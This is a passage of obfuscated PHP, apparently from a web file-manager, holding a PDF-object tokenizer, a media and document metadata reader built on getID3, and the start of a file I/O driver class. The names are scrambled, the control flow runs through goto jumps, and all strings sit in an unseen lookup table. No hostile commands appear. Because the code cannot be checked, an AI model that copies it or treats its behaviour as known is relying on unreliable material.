$aÈĞ½ŠÙáº; $f‘Ò›•‚‚ += 2) { $dã†Šµƒ¼ = hexdec(bin2hex(substr($C¿‡·£œÖ„, $f‘Ò›•‚‚, 2))); $aì¾ô™è‡Ÿ .= mb_convert_encoding($c„µ¯Ç¦Ğ¥[1591] . intval($dã†Šµƒ¼) . $c„µ¯Ç¦Ğ¥[67], $c„µ¯Ç¦Ğ¥[1592], $c„µ¯Ç¦Ğ¥[1593]); } } goto f£¼á©ƒ«Š; C®©êÇ…±…: $aì¾ô™è‡Ÿ = $c„µ¯Ç¦Ğ¥[33]; foreach ($cÇ¨¬ßÕ¦Ş as $eéô§ªéĞ”) { if (preg_match($c„µ¯Ç¦Ğ¥[1583], $eéô§ªéĞ”)) { $aì¾ô™è‡Ÿ .= \chr(hexdec(trim($eéô§ªéĞ”, $c„µ¯Ç¦Ğ¥[1584]))); } else { $aì¾ô™è‡Ÿ .= $eéô§ªéĞ”; } } $cÇ¨¬ßÕ¦Ş = preg_split($c„µ¯Ç¦Ğ¥[1585], $aì¾ô™è‡Ÿ, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto aËéô˜Û›ó; fĞŒŒ÷ºÏ™: } private static function getRawObject($D´²ÁĞÛ„Ñ, $a™°À†À“Á = 0) { goto B…†ÊÒğë; f””ò¨×æ£: return array($D‡÷§±Œñ, $E‚ªïŒ©Îˆ, $a™°À†À“Á); goto fÔ×‰±áÑ; B±¹îĞÇÔ: $a™°À†À“Á += strspn($D´²ÁĞÛ„Ñ, $Döš¥‡—ÖÁ[1594], $a™°À†À“Á); $f¥Ù¹£Ã™ä = $D´²ÁĞÛ„Ñ[$a™°À†À“Á]; switch ($f¥Ù¹£Ã™ä) { case $Döš¥‡—ÖÁ[1595]: $DšÖè¬à¥Á = strcspn($D´²ÁĞÛ„Ñ, $Döš¥‡—ÖÁ[1596], $a™°À†À“Á); if ($DšÖè¬à¥Á > 0) { $a™°À†À“Á += $DšÖè¬à¥Á; return self::getRawObject($D´²ÁĞÛ„Ñ, $a™°À†À“Á); } break; case $Döš¥‡—ÖÁ[8]: $D‡÷§±Œñ = $f¥Ù¹£Ã™ä; ++$a™°À†À“Á; $A¶¹¢Ì²çÔ = preg_match($Döš¥‡—ÖÁ[1597], substr($D´²ÁĞÛ„Ñ, $a™°À†À“Á, 256), $dœ‘„¯à¦); if (1 == $A¶¹¢Ì²çÔ) { $E‚ªïŒ©Îˆ = $dœ‘„¯à¦[1]; $a™°À†À“Á += strlen($E‚ªïŒ©Îˆ); } break; case $Döš¥‡—ÖÁ[248]: case $Döš¥‡—ÖÁ[819]: $D‡÷§±Œñ = $f¥Ù¹£Ã™ä; ++$a™°À†À“Á; $eğìËÓÀæÊ = $a™°À†À“Á; if ($Döš¥‡—ÖÁ[248] == $f¥Ù¹£Ã™ä) { $fÛêåÀ­Ì = 1; while ($fÛêåÀ­Ì > 0) { if (!isset($D´²ÁĞÛ„Ñ[$eğìËÓÀæÊ])) { break; } $B ±¥§¢Ìà = $D´²ÁĞÛ„Ñ[$eğìËÓÀæÊ]; switch ($B ±¥§¢Ìà) { case $Döš¥‡—ÖÁ[93]: ++$eğìËÓÀæÊ; break; case $Döš¥‡—ÖÁ[248]: ++$fÛêåÀ­Ì; break; case $Döš¥‡—ÖÁ[819]: --$fÛêåÀ­Ì; break; } ++$eğìËÓÀæÊ; } $E‚ªïŒ©Îˆ = substr($D´²ÁĞÛ„Ñ, $a™°À†À“Á, $eğìËÓÀæÊ - $a™°À†À“Á - 1); $a™°À†À“Á = $eğìËÓÀæÊ; } break; case $Döš¥‡—ÖÁ[157]: case $Döš¥‡—ÖÁ[476]: $D‡÷§±Œñ = $f¥Ù¹£Ã™ä; ++$a™°À†À“Á; if ($Döš¥‡—ÖÁ[157] == $f¥Ù¹£Ã™ä) { $E‚ªïŒ©Îˆ = array(); do { $d†Ã›Êµêõ = $a™°À†À“Á; $bªÚ‚ÁŸÙ = self::getRawObject($D´²ÁĞÛ„Ñ, $a™°À†À“Á); $a™°À†À“Á = $bªÚ‚ÁŸÙ[2]; $E‚ªïŒ©Îˆ[] = $bªÚ‚ÁŸÙ; } while ($Döš¥‡—ÖÁ[476] != $bªÚ‚ÁŸÙ[0] && $a™°À†À“Á != $d†Ã›Êµêõ); array_pop($E‚ªïŒ©Îˆ); } break; case $Döš¥‡—ÖÁ[927]: case $Döš¥‡—ÖÁ[930]: if (isset($D´²ÁĞÛ„Ñ[$a™°À†À“Á + 1]) && $D´²ÁĞÛ„Ñ[$a™°À†À“Á + 1] == $f¥Ù¹£Ã™ä) { $D‡÷§±Œñ = $f¥Ù¹£Ã™ä . $f¥Ù¹£Ã™ä; $a™°À†À“Á += 2; if ($Döš¥‡—ÖÁ[927] == $f¥Ù¹£Ã™ä) { $E‚ªïŒ©Îˆ = array(); do { $d†Ã›Êµêõ = $a™°À†À“Á; $bªÚ‚ÁŸÙ = self::getRawObject($D´²ÁĞÛ„Ñ, $a™°À†À“Á); $a™°À†À“Á = $bªÚ‚ÁŸÙ[2]; $E‚ªïŒ©Îˆ[] = $bªÚ‚ÁŸÙ; } while ($Döš¥‡—ÖÁ[1598] != $bªÚ‚ÁŸÙ[0] && $a™°À†À“Á != $d†Ã›Êµêõ); array_pop($E‚ªïŒ©Îˆ); } } else { $D‡÷§±Œñ = $f¥Ù¹£Ã™ä; ++$a™°À†À“Á; $A¶¹¢Ì²çÔ = preg_match($Döš¥‡—ÖÁ[1599], substr($D´²ÁĞÛ„Ñ, $a™°À†À“Á), $dœ‘„¯à¦); if ($Döš¥‡—ÖÁ[927] == $f¥Ù¹£Ã™ä && 1 == $A¶¹¢Ì²çÔ) { $E‚ªïŒ©Îˆ = strtr($dœ‘„¯à¦[1], $Döš¥‡—ÖÁ[1600], $Döš¥‡—ÖÁ[33]); $a™°À†À“Á += \strlen($dœ‘„¯à¦[0]); } elseif (!1 !== ($Cğ•”Ù¤° = strpos($D´²ÁĞÛ„Ñ, $Döš¥‡—ÖÁ[930], $a™°À†À“Á))) { $a™°À†À“Á = $Cğ•”Ù¤° + 1; } } break; default: if ($Döš¥‡—ÖÁ[1601] == substr($D´²ÁĞÛ„Ñ, $a™°À†À“Á, 6)) { $D‡÷§±Œñ = $Döš¥‡—ÖÁ[1601]; $a™°À†À“Á += 6; } elseif ($Döš¥‡—ÖÁ[99] == substr($D´²ÁĞÛ„Ñ, $a™°À†À“Á, 4)) { $D‡÷§±Œñ = $Döš¥‡—ÖÁ[99]; $a™°À†À“Á += 4; $E‚ªïŒ©Îˆ = $Döš¥‡—ÖÁ[99]; } elseif ($Döš¥‡—ÖÁ[1602] == substr($D´²ÁĞÛ„Ñ, $a™°À†À“Á, 4)) { $D‡÷§±Œñ = $Döš¥‡—ÖÁ[1603]; $a™°À†À“Á += 4; $E‚ªïŒ©Îˆ = $Döš¥‡—ÖÁ[1602]; } elseif ($Döš¥‡—ÖÁ[1604] == substr($D´²ÁĞÛ„Ñ, $a™°À†À“Á, 5)) { $D‡÷§±Œñ = $Döš¥‡—ÖÁ[1603]; $a™°À†À“Á += 5; $E‚ªïŒ©Îˆ = $Döš¥‡—ÖÁ[1604]; } elseif ($Döš¥‡—ÖÁ[1605] == substr($D´²ÁĞÛ„Ñ, $a™°À†À“Á, 6)) { $D‡÷§±Œñ = $Döš¥‡—ÖÁ[1605]; $a™°À†À“Á += 6; if (1 == preg_match($Döš¥‡—ÖÁ[1606], substr($D´²ÁĞÛ„Ñ, $a™°À†À“Á), $dœ‘„¯à¦)) { $a™°À†À“Á += strlen($dœ‘„¯à¦[0]); $EÆÚà’Å»Ê = $Döš¥‡—ÖÁ[1607]; $A¶¹¢Ì²çÔ = preg_match($EÆÚà’Å»Ê, substr($D´²ÁĞÛ„Ñ, $a™°À†À“Á), $dœ‘„¯à¦, PREG_OFFSET_CAPTURE); if (1 == $A¶¹¢Ì²çÔ) { $E‚ªïŒ©Îˆ = substr($D´²ÁĞÛ„Ñ, $a™°À†À“Á, $dœ‘„¯à¦[0][1]); $a™°À†À“Á += $dœ‘„¯à¦[1][1]; } } } elseif ($Döš¥‡—ÖÁ[1608] == substr($D´²ÁĞÛ„Ñ, $a™°À†À“Á, 9)) { $D‡÷§±Œñ = $Döš¥‡—ÖÁ[1608]; $a™°À†À“Á += 9; } elseif (1 == preg_match($Döš¥‡—ÖÁ[1609], substr($D´²ÁĞÛ„Ñ, $a™°À†À“Á, 33), $dœ‘„¯à¦)) { $D‡÷§±Œñ = $Döš¥‡—ÖÁ[1571]; $a™°À†À“Á += strlen($dœ‘„¯à¦[0]); $E‚ªïŒ©Îˆ = intval($dœ‘„¯à¦[1]) . $Döš¥‡—ÖÁ[70] . intval($dœ‘„¯à¦[2]); } elseif (1 == preg_match($Döš¥‡—ÖÁ[1610], substr($D´²ÁĞÛ„Ñ, $a™°À†À“Á, 33), $dœ‘„¯à¦)) { $D‡÷§±Œñ = $Döš¥‡—ÖÁ[1611]; $E‚ªïŒ©Îˆ = intval($dœ‘„¯à¦[1]) . $Döš¥‡—ÖÁ[70] . intval($dœ‘„¯à¦[2]); $a™°À†À“Á += strlen($dœ‘„¯à¦[0]); } elseif (($Bºó±ª¼˜Ø = strspn($D´²ÁĞÛ„Ñ, $Döš¥‡—ÖÁ[1612], $a™°À†À“Á)) > 0) { $D‡÷§±Œñ = $Döš¥‡—ÖÁ[1613]; $E‚ªïŒ©Îˆ = substr($D´²ÁĞÛ„Ñ, $a™°À†À“Á, $Bºó±ª¼˜Ø); $a™°À†À“Á += $Bºó±ª¼˜Ø; } break; } goto f””ò¨×æ£; B…†ÊÒğë: $Döš¥‡—ÖÁ =& $_SERVER[”Ì÷ñ­î¸]; $D‡÷§±Œñ = $Döš¥‡—ÖÁ[33]; $E‚ªïŒ©Îˆ = $Döš¥‡—ÖÁ[33]; goto B±¹îĞÇÔ; fÔ×‰±áÑ: } } class GetInfo { private static $fileTypeArray; public static function get($C Ù´µàï) { $c„„Òì¢ºÒ = IO::info($C Ù´µàï); return self::infoAdd($c„„Òì¢ºÒ); } public static function infoAdd(&$C³Ÿ“¾›ñ) { goto F¶İÌïØÔ; F¶İÌïØÔ: $EµÏ½”³ =& $_SERVER[”Ì÷ñ­î¸]; static $AÅöç›ÒÖÆ; if (!$AÅöç›ÒÖÆ) { require SDK_DIR . $EµÏ½”³[1614]; $AÅöç›ÒÖÆ = new getID3(); } goto B¶³±ò“öí; AÊ“ƒ›”¦: $C–½³ãµø× = $C³Ÿ“¾›ñ[$EµÏ½”³[160]]; try { if ($C³Ÿ“¾›ñ[$EµÏ½”³[160]] == $EµÏ½”³[1616]) { $B¾«­¿™· = self::psdParse($eæˆ‚ëÊ¯—); $C–½³ãµø× = $EµÏ½”³[1617]; } else { if ($C³Ÿ“¾›ñ[$EµÏ½”³[160]] == $EµÏ½”³[1618]) { $B¾«­¿™· = self::pdfParse($eæˆ‚ëÊ¯—); } else { $C–½³ãµø× = self::$fileTypeArray[$EµÏ½”³[1619]][$C³Ÿ“¾›ñ[$EµÏ½”³[160]]]; $BÈ¢ÙŒÔˆÄ = self::$fileTypeArray[$EµÏ½”³[1620]][$C–½³ãµø×][$EµÏ½”³[1621]]; $E™Î„ƒ°Æ¹ = @$AÅöç›ÒÖÆ->analyze($eæˆ‚ëÊ¯—, $C³Ÿ“¾›ñ[$EµÏ½”³[77]], $C³Ÿ“¾›ñ[$EµÏ½”³[28]]); $B¾«­¿™· = self::parseData($E™Î„ƒ°Æ¹, $BÈ¢ÙŒÔˆÄ, $C³Ÿ“¾›ñ); } } } catch (Exception $eçÍììæï) { $B¾«­¿™· = array($EµÏ½”³[372] => $C–½³ãµø×); } if (!$B¾«­¿™·) { return; } goto aéÜæ§ğ±; B¶³±ò“öí: if (!$C³Ÿ“¾›ñ || $C³Ÿ“¾›ñ[$EµÏ½”³[29]] != $EµÏ½”³[167]) { return; } if (!self::support($C³Ÿ“¾›ñ[$EµÏ½”³[160]]) || isset($C³Ÿ“¾›ñ[$EµÏ½”³[426]])) { return; } $eæˆ‚ëÊ¯— = $EµÏ½”³[1615] . $C³Ÿ“¾›ñ[$EµÏ½”³[75]]; goto AÊ“ƒ›”¦; aéÜæ§ğ±: $B¾«­¿™·[$EµÏ½”³[372]] = $C–½³ãµø×; $C³Ÿ“¾›ñ[$EµÏ½”³[426]] = $B¾«­¿™·; return $C³Ÿ“¾›ñ; goto CÓ”ÜÅõªÔ; CÓ”ÜÅõªÔ: } public static function support($cğ¬°Íªå†) { goto aªÖ‘‘¸«; aªÖ‘‘¸«: $d²Á¤ƒ¹ğ =& $_SERVER[”Ì÷ñ­î¸]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $cğ¬°Íªå† = strtolower($cğ¬°Íªå†); goto bîÀ×Åƒˆ²; bîÀ×Åƒˆ²: $B¥‘ôŠÒŠ… = array($d²Á¤ƒ¹ğ[1618], $d²Á¤ƒ¹ğ[1616]); if (in_array($cğ¬°Íªå†, $B¥‘ôŠÒŠ…)) { return !0; } if (isset(self::$fileTypeArray[$d²Á¤ƒ¹ğ[1619]][$cğ¬°Íªå†])) { return !0; } goto E ½˜Ä»Ôö; E ½˜Ä»Ôö: return !1; goto F­¡È‘¢£ò; F­¡È‘¢£ò: } private static function parseData($b×ìõµî£, $AÚÙªÛºŠ©, $b©Üéßœí) { $c‰óçÚ“×š =& $_SERVER[”Ì÷ñ­î¸]; $dƒ„Áø‹ê¨ = $b×ìõµî£[$c‰óçÚ“×š[1622]]; $cÁŒ´Šƒ = array(); foreach ($AÚÙªÛºŠ© as $CŒ£œ¦Íœ => $e­†òŒ×›Ğ) { foreach ($e­†òŒ×›Ğ as $fÊ§µÎ¦îˆ) { if (is_array($fÊ§µÎ¦îˆ)) { $A¿èóÙÚ– = self::parseData($b×ìõµî£, $e­†òŒ×›Ğ, $b©Üéßœí); if ($A¿èóÙÚ–) { $cÁŒ´Šƒ[$CŒ£œ¦Íœ] = $A¿èóÙÚ–; } break; } $E£Ì¶…Äï = str_replace($c‰óçÚ“×š[1392], $dƒ„Áø‹ê¨, $fÊ§µÎ¦îˆ); $A¿èóÙÚ– = _get($b×ìõµî£, $E£Ì¶…Äï); $A¿èóÙÚ– = is_array($A¿èóÙÚ–) ? $A¿èóÙÚ–[0] : $A¿èóÙÚ–; if ($A¿èóÙÚ–) { break; } } if ($A¿èóÙÚ– || $A¿èóÙÚ– === 0 || $A¿èóÙÚ– === !1) { $A¿èóÙÚ– = self::valueReset($fÊ§µÎ¦îˆ, $A¿èóÙÚ–, $CŒ£œ¦Íœ); if ($A¿èóÙÚ– !== null) { $cÁŒ´Šƒ[$CŒ£œ¦Íœ] = $A¿èóÙÚ–; } } } $cÁŒ´Šƒ = self::valueResetAll($cÁŒ´Šƒ, $b©Üéßœí); return $cÁŒ´Šƒ; } private static function psdParse($DÕõ‰İŒ•Ú) { $CÊÏ‡¸—ç… =& $_SERVER[”Ì÷ñ­î¸]; if (IO::fileSubstr($DÕõ‰İŒ•Ú, 0, 4) != $CÊÏ‡¸—ç…[1623]) { return !1; } $CæêŠ™½á» = getImageSize($DÕõ‰İŒ•Ú, $fš–Ëã½ˆ½); if (!$CæêŠ™½á») { return; } $D©¼ª¹æÒŸ = array($CÊÏ‡¸—ç…[1538] => $CæêŠ™½á»[0], $CÊÏ‡¸—ç…[1540] => $CæêŠ™½á»[1]); return $D©¼ª¹æÒŸ; } private static function pdfParse($eæ“àÌïÈ) { return FileParsePdf::parse($eæ“àÌïÈ); } private static function fileTypeParse() { $c²¤š„‘›À =& $_SERVER[”Ì÷ñ­î¸]; $E›¢à‰æÙì = self::fileTypeArray(); $F–“Ğ¥šƒ = array(); foreach ($E›¢à‰æÙì as $eˆËİêÉ£¸ => $dî¯Íëä…‡) { $FåÄŒ¾‹ƒ = _get($dî¯Íëä…‡, $c²¤š„‘›À[160], $c²¤š„‘›À[33]); $fĞŞè„Ú‘ = is_string($FåÄŒ¾‹ƒ) ? explode($c²¤š„‘›À[47], $FåÄŒ¾‹ƒ) : $FåÄŒ¾‹ƒ; if (!$fĞŞè„Ú‘) { continue; } foreach ($fĞŞè„Ú‘ as $FåÄŒ¾‹ƒ) { $FåÄŒ¾‹ƒ = strtolower(trim($FåÄŒ¾‹ƒ)); if (!$FåÄŒ¾‹ƒ) { continue; } $F–“Ğ¥šƒ[$FåÄŒ¾‹ƒ] = $eˆËİêÉ£¸; } $E›¢à‰æÙì[$eˆËİêÉ£¸][$c²¤š„‘›À[160]] = array_keys($F–“Ğ¥šƒ); $E›¢à‰æÙì[$eˆËİêÉ£¸][$c²¤š„‘›À[1621]] = self::parseKeyMap($dî¯Íëä…‡[$c²¤š„‘›À[1621]]); } return array($c²¤š„‘›À[1620] => $E›¢à‰æÙì, $c²¤š„‘›À[1619] => $F–“Ğ¥šƒ); } private static function parseKeyMap($a‘ÏÆ¬—›Š) { $FÇÕê†ÂŠ¶ =& $_SERVER[”Ì÷ñ­î¸]; foreach ($a‘ÏÆ¬—›Š as $Bƒğ‡Í‡˜” => $dŠ³Çâîºè) { if (is_array($dŠ³Çâîºè)) { $C” èÈ•¸Ã = self::parseKeyMap($dŠ³Çâîºè); if ($C” èÈ•¸Ã) { $a‘ÏÆ¬—›Š[$Bƒğ‡Í‡˜”] = $C” èÈ•¸Ã; } continue; } $BÜ·ß«È° = explode($FÇÕê†ÂŠ¶[47], $dŠ³Çâîºè); $B âòÆÄñ¾ = array(); foreach ($BÜ·ß«È° as $D«¤Òïøœ¦) { $D«¤Òïøœ¦ = trim($D«¤Òïøœ¦); if (!$D«¤Òïøœ¦) { continue; } if (preg_match($FÇÕê†ÂŠ¶[1624], $D«¤Òïøœ¦, $eãßÉŠê’ç)) { $b†ºÃ¨°¢ = explode($FÇÕê†ÂŠ¶[271], $eãßÉŠê’ç[1]); foreach ($b†ºÃ¨°¢ as $cº’›ËíÍ¾) { $B âòÆÄñ¾[] = str_replace($eãßÉŠê’ç[0], $cº’›ËíÍ¾, $D«¤Òïøœ¦); } } else { $B âòÆÄñ¾[] = $D«¤Òïøœ¦; } } $a‘ÏÆ¬—›Š[$Bƒğ‡Í‡˜”] = $B âòÆÄñ¾; } return $a‘ÏÆ¬—›Š; } private static function valueResetAll($B™ÕÙÌì˜î, $AÍ”ğŞ‘ìâ) { goto aÛ¿ğá®À¤; aÛ¿ğá®À¤: $Fˆ›ŒÈÕ¤• =& $_SERVER[”Ì÷ñ­î¸]; if (isset($B™ÕÙÌì˜î[$Fˆ›ŒÈÕ¤•[1625]])) { $b¯‚ĞÕØ = ceil($B™ÕÙÌì˜î[$Fˆ›ŒÈÕ¤•[1625]]); $D™Ù¦øİ = intval($b¯‚ĞÕØ / 3600); $E¹‘…·˜‰Ç = intval(($b¯‚ĞÕØ - $D™Ù¦øİ * 3600) / 60); $aˆ¿ÖåÑ = $b¯‚ĞÕØ % 60; $B™ÕÙÌì˜î[$Fˆ›ŒÈÕ¤•[1626]] = sprintf($Fˆ›ŒÈÕ¤•[1627], $D™Ù¦øİ, $E¹‘…·˜‰Ç, $aˆ¿ÖåÑ); if ($D™Ù¦øİ == 0) { $B™ÕÙÌì˜î[$Fˆ›ŒÈÕ¤•[1626]] = sprintf($Fˆ›ŒÈÕ¤•[1628], $E¹‘…·˜‰Ç, $aˆ¿ÖåÑ); } } $eøä°æè½Ñ = _get($B™ÕÙÌì˜î, $Fˆ›ŒÈÕ¤•[1629]); goto Dğ‘®¶Á‡ø; d£–¦­™Ó±: return $B™ÕÙÌì˜î; goto A¬Àì¥††“; F ÏƒÃ™: $DÊ¸¾’ÓÌª = _get($B™ÕÙÌì˜î, $Fˆ›ŒÈÕ¤•[1637], $Fˆ›ŒÈÕ¤•[33]); $A­ƒÒ¤ø×É = $D²Ö“è­‘Ğ . $Dí˜†ß²â‡ . $DÊ¸¾’ÓÌª; if ($A­ƒÒ¤ø×É && get_charset($A­ƒÒ¤ø×É) != $Fˆ›ŒÈÕ¤•[326]) { $B™ÕÙÌì˜î[$Fˆ›ŒÈÕ¤•[1634]][$Fˆ›ŒÈÕ¤•[1344]] = iconv_to($B™ÕÙÌì˜î[$Fˆ›ŒÈÕ¤•[1634]][$Fˆ›ŒÈÕ¤•[1344]], get_charset($A­ƒÒ¤ø×É), $Fˆ›ŒÈÕ¤•[326]); $B™ÕÙÌì˜î[$Fˆ›ŒÈÕ¤•[1634]][$Fˆ›ŒÈÕ¤•[1638]] = iconv_to($B™ÕÙÌì˜î[$Fˆ›ŒÈÕ¤•[1634]][$Fˆ›ŒÈÕ¤•[1638]], get_charset($A­ƒÒ¤ø×É), $Fˆ›ŒÈÕ¤•[326]); $B™ÕÙÌì˜î[$Fˆ›ŒÈÕ¤•[1634]][$Fˆ›ŒÈÕ¤•[1639]] = iconv_to($B™ÕÙÌì˜î[$Fˆ›ŒÈÕ¤•[1634]][$Fˆ›ŒÈÕ¤•[1639]], get_charset($A­ƒÒ¤ø×É), $Fˆ›ŒÈÕ¤•[326]); } goto d£–¦­™Ó±; Dğ‘®¶Á‡ø: if ($eøä°æè½Ñ) { $D‘ë–ƒ¦çö = IO_PATH_SYSTEM_TEMP . $Fˆ›ŒÈÕ¤•[1630] . KodIO::hashPath($AÍ”ğŞ‘ìâ) . $Fˆ›ŒÈÕ¤•[1631]; $B™ÕÙÌì˜î[$Fˆ›ŒÈÕ¤•[1632]] = Action($Fˆ›ŒÈÕ¤•[1633])->pluginCacheFileSet($D‘ë–ƒ¦çö, $eøä°æè½Ñ); unset($B™ÕÙÌì˜î[$Fˆ›ŒÈÕ¤•[1634]][$Fˆ›ŒÈÕ¤•[1617]]); } $D²Ö“è­‘Ğ = _get($B™ÕÙÌì˜î, $Fˆ›ŒÈÕ¤•[1635], $Fˆ›ŒÈÕ¤•[33]); $Dí˜†ß²â‡ = _get($B™ÕÙÌì˜î, $Fˆ›ŒÈÕ¤•[1636], $Fˆ›ŒÈÕ¤•[33]); goto F ÏƒÃ™; A¬Àì¥††“: } private static function valueReset($eºøõ´Ÿ, $dÇ ëø×, $cÑ¡îÒ˜„æ) { $fÃÈ¨ù«¤ =& $_SERVER[”Ì÷ñ­î¸]; $aÍÍÇğÏÜç = $fÃÈ¨ù«¤[1555]; switch ($eºøõ´Ÿ) { case $fÃÈ¨ù«¤[1640]: $dÇ ëø× = $dÇ ëø× == $fÃÈ¨ù«¤[83] ? $fÃÈ¨ù«¤[1641] : $fÃÈ¨ù«¤[1642]; break; case $fÃÈ¨ù«¤[1643]: $dÇ ëø× = $dÇ ëø× ? $dÇ ëø× : null; break; default: break; } switch ($cÑ¡îÒ˜„æ) { case $fÃÈ¨ù«¤[1644]: $dÇ ëø× = round($dÇ ëø×, 2); break; case $fÃÈ¨ù«¤[187]: case $fÃÈ¨ù«¤[107]: if ($dÇ ëø× < 0) { $dÇ ëø× = null; } else { if (is_numeric($dÇ ëø×)) { $dÇ ëø× = date($aÍÍÇğÏÜç, $dÇ ëø×); } } break; default: break; } return $dÇ ëø×; } private static function fileTypeArray() { $dœÒóèÄ›• =& $_SERVER[”Ì÷ñ­î¸]; return array($dœÒóèÄ›•[1617] => array($dœÒóèÄ›•[160] => $dœÒóèÄ›•[1645] . $dœÒóèÄ›•[1646], $dœÒóèÄ›•[1621] => array($dœÒóèÄ›•[1538] => $dœÒóèÄ›•[1647], $dœÒóèÄ›•[1540] => $dœÒóèÄ›•[1648], $dœÒóèÄ›•[1649] => $dœÒóèÄ›•[1650], $dœÒóèÄ›•[1651] => $dœÒóèÄ›•[1652], $dœÒóèÄ›•[187] => $dœÒóèÄ›•[1653], $dœÒóèÄ›•[107] => $dœÒóèÄ›•[1654], $dœÒóèÄ›•[1655] => $dœÒóèÄ›•[1656], $dœÒóèÄ›•[1657] => $dœÒóèÄ›•[1658], $dœÒóèÄ›•[1659] => $dœÒóèÄ›•[1660], $dœÒóèÄ›•[1661] => $dœÒóèÄ›•[1662], $dœÒóèÄ›•[1663] => $dœÒóèÄ›•[1664], $dœÒóèÄ›•[1665] => $dœÒóèÄ›•[1666], $dœÒóèÄ›•[1667] => $dœÒóèÄ›•[1668], $dœÒóèÄ›•[1669] => array($dœÒóèÄ›•[1670] => $dœÒóèÄ›•[1671], $dœÒóèÄ›•[1672] => $dœÒóèÄ›•[1673], $dœÒóèÄ›•[1674] => $dœÒóèÄ›•[1675]), $dœÒóèÄ›•[1676] => $dœÒóèÄ›•[1677], $dœÒóèÄ›•[1678] => $dœÒóèÄ›•[1679], $dœÒóèÄ›•[1680] => $dœÒóèÄ›•[1681], $dœÒóèÄ›•[1682] => $dœÒóèÄ›•[1683], $dœÒóèÄ›•[1684] => array($dœÒóèÄ›•[1685] => $dœÒóèÄ›•[1686], $dœÒóèÄ›•[1687] => $dœÒóèÄ›•[1688], $dœÒóèÄ›•[1689] => $dœÒóèÄ›•[1690], $dœÒóèÄ›•[1691] => $dœÒóèÄ›•[1692], $dœÒóèÄ›•[1693] => $dœÒóèÄ›•[1694], $dœÒóèÄ›•[1695] => $dœÒóèÄ›•[1696], $dœÒóèÄ›•[1697] => $dœÒóèÄ›•[1698], $dœÒóèÄ›•[1699] => $dœÒóèÄ›•[1700], $dœÒóèÄ›•[1701] => $dœÒóèÄ›•[1702], $dœÒóèÄ›•[1703] => $dœÒóèÄ›•[1704], $dœÒóèÄ›•[1705] => $dœÒóèÄ›•[1706]))), $dœÒóèÄ›•[1707] => array($dœÒóèÄ›•[160] => $dœÒóèÄ›•[1708] . $dœÒóèÄ›•[1709], $dœÒóèÄ›•[1621] => array($dœÒóèÄ›•[1625] => $dœÒóèÄ›•[1710], $dœÒóèÄ›•[187] => $dœÒóèÄ›•[1711], $dœÒóèÄ›•[107] => $dœÒóèÄ›•[1712], $dœÒóèÄ›•[1657] => $dœÒóèÄ›•[1713], $dœÒóèÄ›•[1714] => $dœÒóèÄ›•[1715], $dœÒóèÄ›•[1716] => $dœÒóèÄ›•[1643], $dœÒóèÄ›•[1717] => $dœÒóèÄ›•[1718], $dœÒóèÄ›•[1719] => $dœÒóèÄ›•[1720], $dœÒóèÄ›•[1721] => $dœÒóèÄ›•[1722], $dœÒóèÄ›•[1634] => array($dœÒóèÄ›•[1344] => $dœÒóèÄ›•[1723], $dœÒóèÄ›•[1638] => $dœÒóèÄ›•[1724], $dœÒóèÄ›•[1639] => $dœÒóèÄ›•[1725], $dœÒóèÄ›•[1726] => $dœÒóèÄ›•[1727], $dœÒóèÄ›•[1728] => $dœÒóèÄ›•[1729], $dœÒóèÄ›•[1730] => $dœÒóèÄ›•[1731], $dœÒóèÄ›•[1617] => $dœÒóèÄ›•[1732]))), $dœÒóèÄ›•[1733] => array($dœÒóèÄ›•[160] => $dœÒóèÄ›•[1734] . $dœÒóèÄ›•[1735], $dœÒóèÄ›•[1621] => array($dœÒóèÄ›•[1538] => $dœÒóèÄ›•[1736], $dœÒóèÄ›•[1540] => $dœÒóèÄ›•[1737], $dœÒóèÄ›•[1625] => $dœÒóèÄ›•[1710], $dœÒóèÄ›•[187] => $dœÒóèÄ›•[1738], $dœÒóèÄ›•[107] => $dœÒóèÄ›•[1739], $dœÒóèÄ›•[1644] => $dœÒóèÄ›•[1740], $dœÒóèÄ›•[1721] => $dœÒóèÄ›•[1741], $dœÒóèÄ›•[1717] => $dœÒóèÄ›•[1742], $dœÒóèÄ›•[1657] => $dœÒóèÄ›•[1743], $dœÒóèÄ›•[1707] => array($dœÒóèÄ›•[1716] => $dœÒóèÄ›•[1643], $dœÒóèÄ›•[1744] => $dœÒóèÄ›•[1745], $dœÒóèÄ›•[1714] => $dœÒóèÄ›•[1715], $dœÒóèÄ›•[1721] => $dœÒóèÄ›•[1722], $dœÒóèÄ›•[1717] => $dœÒóèÄ›•[1746], $dœÒóèÄ›•[1719] => $dœÒóèÄ›•[1720]))), $dœÒóèÄ›•[1747] => array($dœÒóèÄ›•[1621] => array($dœÒóèÄ›•[1748] => $dœÒóèÄ›•[1749], $dœÒóèÄ›•[1750] => $dœÒóèÄ›•[1751])), $dœÒóèÄ›•[1752] => array($dœÒóèÄ›•[1621] => array())); } } goto Aø‰Ã‰è×; Fà±šÍÔê™: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($f‡ëÊ¾­ˆÙ, $fƒå©‡¤ª‡) { $f­òË®‰Ô = self::driverMake($fƒå©‡¤ª‡[0]); if (method_exists($f­òË®‰Ô, $f‡ëÊ¾­ˆÙ)) { return @call_user_func_array(array($f­òË®‰Ô, $f‡ëÊ¾­ˆÙ), $fƒå©‡¤ª‡); } if (method_exists($f­òË®‰Ô, $_SERVER[”Ì÷ñ­î¸][997])) { return @call_user_func_array(array($f­òË®‰Ô, $f‡ëÊ¾­ˆÙ), $fƒå©‡¤ª‡); } else { if (method_exists(self, $f‡ëÊ¾­ˆÙ)) { return @call_user_func_array(array(self, $f‡ëÊ¾­ˆÙ), $fƒå©‡¤ª‡); } else { call_user_func_array(array(parent, $f‡ëÊ¾­ˆÙ), $fƒå©‡¤ª‡); } } } public static function init($A× ¼Å‹Ñø) { return self::driverMake($A× ¼Å‹Ñø); } public static function copy($fÃ…µ…ŒÙí, $Fš ôñ¥ö’, $fºé´ß… Í = false, $bäòÜîí¼¹ = false) { return self::copyMove($fÃ…µ…ŒÙí, $Fš ôñ¥ö’, $fºé´ß… Í, $_SERVER[”Ì÷ñ­î¸][490], $bäòÜîí¼¹); } public static function move($b×øÑ‡òÛ£, $Cì«ôéí, $E­ªìÆÏá = false, $e‡íƒßĞ¶… = false) { return self::copyMove($b×øÑ‡òÛ£, $Cì«ôéí, $E­ªìÆÏá, $_SERVER[”Ì÷ñ­î¸][492], $e‡íƒßĞ¶…); 